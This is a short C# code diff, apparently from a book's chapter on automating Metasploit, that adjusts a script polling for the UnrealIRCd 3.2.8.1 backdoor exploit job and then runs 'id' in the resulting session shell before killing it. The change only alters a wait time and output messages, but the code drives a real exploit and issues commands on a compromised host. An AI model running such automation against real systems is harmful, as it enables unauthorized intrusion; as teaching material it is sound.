@@ -40,7 +40,7 @@ namespace ch13_automating_metasploit
 					response = manager.ListJobs ();
 					while (response.ContainsValue ("Exploit: unix/irc/unreal_ircd_3281_backdoor")) {
 						Console.WriteLine ("Waiting");
-						System.Threading.Thread.Sleep (5000);
+						System.Threading.Thread.Sleep (10000);
 						response = manager.ListJobs ();
 					}
 
@@ -52,7 +52,8 @@ namespace ch13_automating_metasploit
 						manager.WriteToSessionShell (id, "id\n");
 						System.Threading.Thread.Sleep (1000);
 						response = manager.ReadSessionShell (id);
-						Console.WriteLine (response ["data"]);
+						Console.WriteLine ("We are user: " + response ["data"]);
+						Console.WriteLine ("Killing session: " + id);
 						manager.StopSession (id);
 					}
 				}
